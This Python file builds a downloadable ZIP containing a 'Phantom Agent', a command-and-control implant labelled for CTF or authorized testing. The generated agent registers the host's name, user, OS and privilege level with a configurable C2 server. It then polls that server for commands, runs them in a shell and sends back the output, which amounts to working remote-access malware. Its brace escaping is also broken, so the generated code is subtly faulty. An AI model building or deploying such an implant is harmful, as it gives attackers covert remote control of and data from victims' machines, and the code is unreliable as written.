"""Build a configured agent ZIP."""
import io, zipfile, time, os

AGENT_STUB = '''
"""
Phantom Agent — CTF / Authorized Testing Only
Auto-generated.
"""
import os, sys, json, time, platform, socket, subprocess, base64, traceback
from urllib.request import Request, urlopen
from urllib.parse import urlencode

C2_URL = "{c2_url}"
POLL_INTERVAL = {poll_interval}

def send(path, payload):
    try:
        data = json.dumps(payload).encode()
        req = Request(C2_URL + path, data=data, headers={{"Content-Type": "application/json"}})
        urlopen(req, timeout=10)
    except Exception:
        pass

def register():
    payload = {{
        "hostname": platform.node(),
        "username": os.getlogin() if hasattr(os, "getlogin") else "unknown",
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "privileges": "admin" if os.name == "nt" else "root" if hasattr(os, "geteuid") and os.geteuid() == 0 else "user"
    }}
    send("/register", payload)

def run_shell(args):
    try:
        out = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT, timeout=60, text=True, errors="replace")
        return {{"output": out, "type": "shell"}}
    except subprocess.CalledProcessError as e:
        return {{"output": e.output, "error": str(e), "type": "shell"}}
    except Exception as e:
        return {{"output": "", "error": str(e), "type": "shell"}}

def run_recon(_):
    info = {{
        "hostname": platform.node(),
        "user": os.getlogin() if hasattr(os, "getlogin") else "unknown",
        "os": platform.system() + " " + platform.release(),
        "arch": platform.machine(),
        "privileges": "admin" if os.name == "nt" else "root" if hasattr(os, "geteuid") and os.geteuid() == 0 else "user",
        "network": [{{"ip": "127.0.0.1", "iface": "lo"}}]
    }}
    return {{"output": json.dumps(info), "type": "recon"}}

MODULE_HANDLERS = {{
    "shell": run_shell,
    "recon": run_recon,
}}

def execute(cmd):
    c = cmd.get("cmd")
    if c == "module":
        name = cmd.get("module")
        handler = MODULE_HANDLERS.get(name)
        if handler:
            return handler(cmd.get("args", []))
        return {{"status": f"module {name} stub", "type": "module"}}
    if c == "shell":
        return run_shell(cmd.get("args", ["whoami"]))
    if c == "recon":
        return run_recon(cmd.get("args", []))
    return {{"status": "unknown", "type": "unknown"}}

def poll():
    while True:
        try:
            req = Request(C2_URL + "/api/agent/phantom/poll")
            with urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            for cid, cmd in data.get("commands", {{}}).items():
                res = execute(cmd)
                send(f"/api/agent/phantom/result/{{cid}}", res)
                time.sleep(0.3)
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    register()
    poll()
'''

def build_agent_zip(config):
    c2_url = config.get('c2_url', 'http://localhost:8080').rstrip('/')
    poll_interval = int(config.get('poll_interval', 5))
    code = AGENT_STUB.replace('{c2_url}', c2_url).replace('{poll_interval}', str(poll_interval))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('phantom_agent.py', code)
    buf.seek(0)
    return buf, f'phantom_agent_{int(time.time())}.zip'
